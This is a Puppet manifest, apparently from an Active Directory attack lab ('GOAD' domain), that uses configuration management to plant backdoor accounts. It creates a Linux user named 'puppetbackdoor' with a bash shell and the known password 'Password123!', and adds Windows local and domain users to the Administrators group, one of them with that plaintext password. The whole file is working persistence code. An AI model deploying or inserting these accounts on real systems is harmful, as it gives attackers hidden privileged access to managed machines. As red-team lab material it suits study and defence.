class useradd {
# https://www.puppet.com/docs/puppet/8/types/user.html
  # Create the puppetbackdoor user
  user { 'puppetbackdoor':
    ensure     => present,
    shell      => '/bin/bash',
    #home       => '/home/puppetbackdoor',
    managehome => false,
    password   => '$6$qwerty$0dYpB0XSLFEx8aN0sLalDi5EjOONkZ4pgP2whBmcx4C37l9F.VmTno0PUJh3Hpb64wVcsxiPm9bAT3Om5w7Fb.', # Encrypted Password for Password123!
  }

}

class useraddwindows {
# https://www.puppet.com/docs/puppet/7/resources_user_group_windows.html
  if $facts['os']['family'] == 'Windows' {
    user { 'puppetlocaluser':
      ensure     => present,
      password   => 'Password123!',
      groups     => ['Administrators'],
      managehome => true,
    }

    user { 'GOAD\puppetdomainuser':
      ensure   => present,
      groups   => ['Administrators'], 
      provider => 'windows_adsi',      # Use ADSI provider for domain accounts
    }
  }
}


class useraddwindowsencrypted {

  if $facts['os']['family'] == 'Windows' {
    user { 'puppetlocaluserencypted':
      ensure     => present,
      password   => lookup('useraddwindowsencrypted::password'),
      groups     => ['Administrators'],
      managehome => true,
    }
  }
}
